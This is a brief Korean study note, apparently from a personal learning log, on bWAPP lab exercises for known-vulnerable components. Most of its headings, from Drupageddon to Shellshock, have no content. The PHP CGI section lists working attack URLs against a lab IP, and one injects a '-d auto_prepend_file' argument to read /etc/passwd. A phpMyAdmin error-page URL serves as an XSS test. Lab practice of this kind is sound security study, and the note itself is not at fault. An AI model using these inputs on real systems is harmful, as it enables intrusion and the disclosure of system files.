# A9 알려진 취약 컴포넌트 공격

## Drupal SQL Injection (Drupageddon)

&#x20;반응 없음

## Heartbleed Vulnerability

## PHP CGI Remote Code Execution

* 참조: [CGI](https://krjaeh0.gitbook.io/j-log/programming/cs_basics/web_technologies/web-basics/cgi)

http://59.23.133.107/bWAPP/admin/phpinfo.php

http://59.23.133.107/bWAPP/admin/?-s\
http://59.23.133.107/bWAPP/admin/?-d+auto\_prepend\_file%3d/etc/passwd

## PHP Eval Function

* code 인젝션과 같다.

## phpMyAdmin BBCode Tag XSS

* 참조: [BBCode](https://krjaeh0.gitbook.io/j-log/programming/cs_basics/web_technologies/web-basics/bbcode)

http://59.23.133.107/phpmyadmin/error.php

http://59.23.133.107/phpmyadmin/error.php?error=a

## Shellshock Vulnerability (CGI)
